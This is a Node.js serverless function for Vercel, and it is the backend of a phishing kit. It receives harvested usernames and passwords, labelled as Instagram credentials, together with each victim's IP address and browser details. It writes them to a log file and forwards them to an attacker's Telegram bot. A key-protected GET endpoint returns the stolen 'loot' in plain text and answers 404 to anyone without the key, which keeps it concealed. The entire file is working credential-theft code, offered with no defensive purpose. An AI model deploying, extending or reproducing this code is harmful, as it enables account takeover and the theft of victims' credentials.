// lang: Node, file: api/logs.js, target: Vercel serverless (Node 20)
// POST /logs  -> append credential entry
// GET  /logs?k=<VIEW_KEY> -> plaintext dump (set VIEW_KEY in Vercel env)
// Storage: /tmp is the only writable path on Vercel; per-instance, ephemeral.
//           For durable loot, forward to Telegram or a KV store — see notes.

export const config = { runtime: 'nodejs' };

function fmtEntry(d, ip) {
  return [
    `=== ${d.ts || new Date().toISOString()} ===`,
    `IP: ${ip}`,
    `UA: ${d.ua || ''}`,
    `Lang: ${d.lang || ''}`,
    `Ref: ${d.ref || ''}`,
    `User: ${d.username || ''}`,
    `Pass: ${d.password || ''}`,
    '',
    '',
  ].join('\n');
}

async function appendEntry(entry) {
  // Vercel: /tmp persists only for the life of the warm lambda instance.
  // Sufficient to demo; NOT sufficient for real capture.
  const fs = await import('node:fs/promises');
  const path = '/tmp/logs.txt';
  try { await fs.appendFile(path, entry); } catch (_) {}
}

async function forwardTelegram(d) {
  const token = process.env.TG_TOKEN;
  const chat  = process.env.TG_CHAT_ID;
  if (!token || !chat) return;
  const text = `IG creds\nUser: ${d.username}\nPass: ${d.password}\nUA: ${d.ua}\nIP: ${d.ip || ''}`;
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chat, text }),
    });
  } catch (_) {}
}

export default async function handler(req, res) {
  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
           || req.socket?.remoteAddress || 'unknown';

  if (req.method === 'POST') {
    let body = req.body;
    if (typeof body === 'string') { try { body = JSON.parse(body); } catch { body = {}; } }
    body = body || {};
    if (!body.username && !body.password) { res.status(204).end(); return; }

    await appendEntry(fmtEntry(body, ip));
    forwardTelegram({ ...body, ip }).catch(() => {});
    res.status(204).end();
    return;
  }

  if (req.method === 'GET') {
    const key = process.env.VIEW_KEY || '';
    if (!key || (req.query && req.query.k) !== key) {
      res.status(404).end();
      return;
    }
    const fs = await import('node:fs/promises');
    let data = '';
    try { data = await fs.readFile('/tmp/logs.txt', 'utf8'); } catch (_) { data = ''; }
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.status(200).send(data || '(empty)');
    return;
  }

  res.status(405).end();
}
